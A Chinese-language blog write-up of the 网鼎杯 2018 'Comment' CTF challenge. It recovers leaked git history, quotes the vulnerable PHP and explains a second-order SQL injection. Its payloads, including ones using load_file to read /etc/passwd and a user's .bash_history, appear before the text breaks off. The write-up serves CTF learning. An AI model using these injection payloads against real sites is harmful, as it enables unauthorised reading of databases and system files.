@@ -1,0 +1,856 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="leekos">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="[TOC] [网鼎杯 2018]Comment进去发现一个留言板，测试了一下好像没什么东西  然后目录扫描一下，发现了git泄露，用GitHack获取  发现没什么东西，然后我们使用 git log --all查看所有分支的git提交记录：  切换到第一个： 1git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c  获取到完整php文件">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Comment">
+<meta property="og:url" content="https://leekosss.github.io/2023/08/24/Comment/index.html">
+<meta property="og:site_name" content="Tranquility">
+<meta property="og:description" content="[TOC] [网鼎杯 2018]Comment进去发现一个留言板，测试了一下好像没什么东西  然后目录扫描一下，发现了git泄露，用GitHack获取  发现没什么东西，然后我们使用 git log --all查看所有分支的git提交记录：  切换到第一个： 1git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c  获取到完整php文件">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/05/14/XIvKMilZVmdCjcJ.png">
+<meta property="og:image" content="https://s2.loli.net/2023/05/14/GoM1D9A8zbJgBas.png">
+<meta property="og:image" content="https://s2.loli.net/2023/05/14/sKbl7eNoX5HBFVv.png">
+<meta property="og:image" content="https://s2.loli.net/2023/05/14/LyisATHFCwo8mvj.png">
+<meta property="og:image" content="https://s2.loli.net/2023/05/14/ul1EFGvyRDQkrL2.png">
+<meta property="og:image" content="https://s2.loli.net/2023/05/14/VaT2O47HDyoqlrA.png">
+<meta property="og:image" content="https://s2.loli.net/2023/05/14/X2Zbgrxp83BFPYq.png">
+<meta property="article:published_time" content="2023-08-24T14:38:04.518Z">
+<meta property="article:modified_time" content="2023-06-05T06:58:39.903Z">
+<meta property="article:author" content="leekos">
+<meta property="article:tag" content="Comment">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://s2.loli.net/2023/05/14/XIvKMilZVmdCjcJ.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>Comment - Tranquility</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"leekosss.github.io","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Tranquility</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Comment"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-24 22:38" pubdate>
+          2023年8月24日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          44 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Comment</h1>
+            
+              <p class="note note-info">
+                
+                  
+                    本文最后更新于：2023年6月5日 下午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <p>[TOC]</p>
+<h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p>进去发现一个留言板，测试了一下好像没什么东西</p>
+<p><img src="https://s2.loli.net/2023/05/14/XIvKMilZVmdCjcJ.png" srcset="/img/loading.gif" lazyload alt="image-20230514131240742"></p>
+<p>然后目录扫描一下，发现了git泄露，用<code>GitHack</code>获取</p>
+<p><img src="https://s2.loli.net/2023/05/14/GoM1D9A8zbJgBas.png" srcset="/img/loading.gif" lazyload alt="image-20230514131418239"></p>
+<p>发现没什么东西，然后我们使用 <code>git log --all</code>查看所有分支的git提交记录：</p>
+<p><img src="https://s2.loli.net/2023/05/14/sKbl7eNoX5HBFVv.png" srcset="/img/loading.gif" lazyload alt="image-20230514131506750"></p>
+<p>切换到第一个：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">git reset --hard e<span class="hljs-number">5</span>b<span class="hljs-number">2</span>a<span class="hljs-number">2443</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>b<span class="hljs-number">6</span>d<span class="hljs-number">395</span>d<span class="hljs-number">06960123142</span>bc<span class="hljs-number">91123148</span><span class="hljs-keyword">c</span><br></code></pre></td></tr></table></figure>
+
+<p>获取到完整php文件内容：</p>
+<p>write_do.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>仔细分析一下，发现 <code>category</code>变量存在二次注入</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>	...<br><br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p>在<code>write</code>写的时候，使用了<code>addslashes()</code>函数，会将单引号 <code>&#39;</code>、双引号<code>&quot;</code>、反斜杠 <code>\</code>等 加上一个反斜杠转义</p>
+<p>然后<code>comment</code>中取出 <code>category</code>，但是没有进行转义，这就造成了二次注入漏洞</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;;<br>...<br>$category <span class="hljs-operator">=</span> mysql_fetch_array($<span class="hljs-keyword">result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br></code></pre></td></tr></table></figure>
+
+<p>但是在<code>write</code>中使用 <code>addslashes()</code>后，<strong>存入数据库时并不会将转义后添加的<code>\</code>存入数据库中</strong></p>
+<p>于是我们先在<code>write</code>中写入：</p>
+<figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">&#x27;,content</span>=<span class="hljs-string">user(),/*</span><br></code></pre></td></tr></table></figure>
+
+<img src="https://s2.loli.net/2023/05/14/LyisATHFCwo8mvj.png" srcset="/img/loading.gif" lazyload alt="image-20230514132606523" style="zoom:50%;" />
+
+
+
+
+
+
+
+<p>但是提示我们需要登录，直接爆破一下，密码加上666</p>
+<p>然后在<code>comment</code>中为<code>content</code>赋值：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">content</span>=*/<span class="hljs-comment">#&amp;bo_id=14</span><br></code></pre></td></tr></table></figure>
+
+<p>这是什么意思呢？</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">$category <span class="hljs-operator">=</span> mysql_fetch_array($<span class="hljs-keyword">result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>$content <span class="hljs-operator">=</span> addslashes($_POST[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> &quot;insert into comment<br>            set category = &#x27;$category&#x27;,<br>                content = &#x27;$content&#x27;,<br>                bo_id = &#x27;$bo_id&#x27;&quot;;<br></code></pre></td></tr></table></figure>
+
+<p>将category取出，然后再为content赋值，代码变成了这样：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">$<span class="hljs-keyword">sql</span> <span class="hljs-operator">=</span> &quot;insert into comment<br>            set category = &#x27;&#x27;,content=user(),/*&#x27;,<br>                content = &#x27;*/#&#x27;,<br>                bo_id = &#x27;$bo_id&#x27;&quot;;<br></code></pre></td></tr></table></figure>
+
+<p>这里我们恰好注释掉了 <code>content</code>，将其设置为自定义的。</p>
+<p>&#x2F;**&#x2F;可以多行注释。#只能单行注释，注释掉了后面的 <code>&#39;,</code></p>
+<p><img src="https://s2.loli.net/2023/05/14/ul1EFGvyRDQkrL2.png" srcset="/img/loading.gif" lazyload alt="image-20230514133313615"></p>
+<p>查询出来了root权限。</p>
+<p>然后继续查库名、表名。。发现查询不到flag</p>
+<p>由于此处是 root权限，可以使用 <code>load_file()</code>函数读取文件，我们读取一下 <code>/etc/passwd</code></p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs makefile">category=&#x27;,content=load_file(<span class="hljs-string">&quot;/etc/passwd&quot;</span>),/*<br></code></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p><code>/etc/passwd</code> 是一个文件，它记录了系统上的用户账号信息。每行记录表示一个用户账号，每行记录包含了如下字段：</p>
+<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-symbol">username:</span><span class="hljs-symbol">password:</span><span class="hljs-variable constant_">UID</span><span class="hljs-symbol">:GID</span><span class="hljs-symbol">:GECOS</span><span class="hljs-symbol">:home_directory</span><span class="hljs-symbol">:login_shell</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>username</code>：用户登录名</li>
+<li><code>password</code>：加密后的用户密码，现在一般为 “x”，表示密码存储在 <code>/etc/shadow</code> 文件中</li>
+<li><code>UID</code>：用户ID，是一个整数值，用来唯一标识该用户</li>
+<li><code>GID</code>：用户所属的组ID</li>
+<li><code>GECOS</code>：用户的全名或注释信息</li>
+<li><code>home_directory</code>：用户的主目录</li>
+<li><code>login_shell</code>：用户登录后使用的默认shell程序</li>
+</ul>
+<p>例如，下面是一个 <code>/etc/passwd</code> 文件的示例：</p>
+<figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span><br><span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br><span class="hljs-symbol">bin:</span><span class="hljs-symbol">x:</span><span class="hljs-number">2</span><span class="hljs-symbol">:</span><span class="hljs-number">2</span><span class="hljs-symbol">:bin</span><span class="hljs-symbol">:/bin</span><span class="hljs-symbol">:/usr/sbin/nologin</span><br></code></pre></td></tr></table></figure>
+
+<p>可以使用 <code>cat</code> 命令来查看 <code>/etc/passwd</code> 文件的内容，例如：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cat <span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure>
+</blockquote>
+<p><img src="https://s2.loli.net/2023/05/14/VaT2O47HDyoqlrA.png" srcset="/img/loading.gif" lazyload alt="image-20230514133819724"></p>
+<p>这里我们发现 <code>www</code>用户的<strong>用户主目录刚好为 <code>/home</code></strong></p>
+<p>这个目录下有一个神奇的文件：<code>.bash_history</code></p>
+<blockquote>
+<p><code>.bash_history</code> 是一个隐藏文件，它<strong>保存了用户在命令行界面中输入的历史命令记录</strong>。当用户退出当前命令行终端时，系统会将当前的历史命令保存到 <code>.bash_history</code> 文件中，下次用户登录时，可以使用方向键等功能浏览并调用之前输入过的命令。</p>
+<p><strong><code>.bash_history</code> 文件通常位于用户的主目录</strong>下，可以使用以下命令来查看该文件的内容：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> ~/.bash_history<br></code></pre></td></tr></table></figure>
+
+<p>也可以使用其他文本编辑器，如 <code>vi</code>、<code>nano</code> 等编辑器来查看和编辑该文件，例如：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">vi ~/.bash_history<br></code></pre></td></tr></table></figure>
+
+<p>需要注意的是，<code>.bash_history</code> 文件中包含了用户输入的所有命令记录，包括敏感信息，因此需要妥善保管。为了保护用户的隐私，可以使用 <code>history</code> 命令来清除或删除历史命令记录，也可以在用户的 <code>~/.bashrc</code> 文件中设置不记录历史命令等操作。</p>
+</blockquote>
+<p>我们查看一下：</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs maxima">&#x27;,<span class="hljs-built_in">content</span>=load_file(<span class="hljs-string">&quot;/home/www/.bash_history&quot;</span>),<span class="hljs-comment">/*</span><br></code></pre></td></tr></table></figure>
+
+<p>得到：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/tmp/</span><br>unzip html.zip<br>rm -f html.zip<br>cp -r html <span class="hljs-regexp">/var/</span>www/<br>cd <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span><br>rm -f .DS_Store<br>service apache2 start<br></code></pre></td></tr></table></figure>
+
+<p>这一些指令的意思是：</p>
+<p>解压 <code>/tmp</code>下的 <code>html.zip</code>压缩包，然后删除这个压缩包，复制<code>html</code>目录到 <code>/var/www/html</code>下，删除该目录的 <code>.DS_Store</code>文件</p>
+<blockquote>
+<p><code>.DS_Store</code> 是一个隐藏文件，它通常出现在 Mac OS 系统中，用于存储某个目录的自定义显示属性，例如图标位置、背景色等。在打开一个包含 <code>.DS_Store</code> 文件的文件夹时，系统会根据该文件中保存的自定义属性来展示文件夹的显示效果。</p>
+<p><code>.DS_Store</code> 文件是由 Finder 应用程序自动生成和维护的，它存储了目录的各种视觉和结构属性，如文件的位置、大小、图标等。该文件默认是隐藏的，因此在正常使用的情况下，用户无法看到它。但在一些情况下，例如将一个 Mac 上的文件夹复制到其他系统或者网络共享中时，<code>.DS_Store</code> 文件可能会成为一个问题。</p>
+<p>如果不希望 <code>.DS_Store</code> 文件在复制或共享时被包含在内，可以通过以下方法来禁用它的生成：</p>
+<ol>
+<li><p>在命令行中使用如下命令：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">defaults <span class="hljs-built_in">write</span> com.apple.desktopservices DSDontWriteNetworkStores <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
+
+<p>该命令会禁用在网络共享中生成 <code>.DS_Store</code> 文件。</p>
+</li>
+<li><p>在命令行中使用如下命令：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">defaults <span class="hljs-built_in">write</span> com.apple.finder CreateDesktop <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure>
+
+<p>该命令会禁用在本地目录中生成 <code>.DS_Store</code> 文件。</p>
+</li>
+</ol>
+<p>需要注意的是，禁用 <code>.DS_Store</code> 文件可能会影响到 Finder 的显示效果，因此建议在操作前备份好数据，并在需要时重新启用该文件。</p>
+</blockquote>
+<p><code>.DS_Store</code>文件存储了<code>html</code>目录的一些属性。</p>
+<p>这里注意的是，虽然删除了该目录的该文件，但是 <code>/tmp/html</code>目录下没有删除，</p>
+<p>我们获取一下该文件：</p>
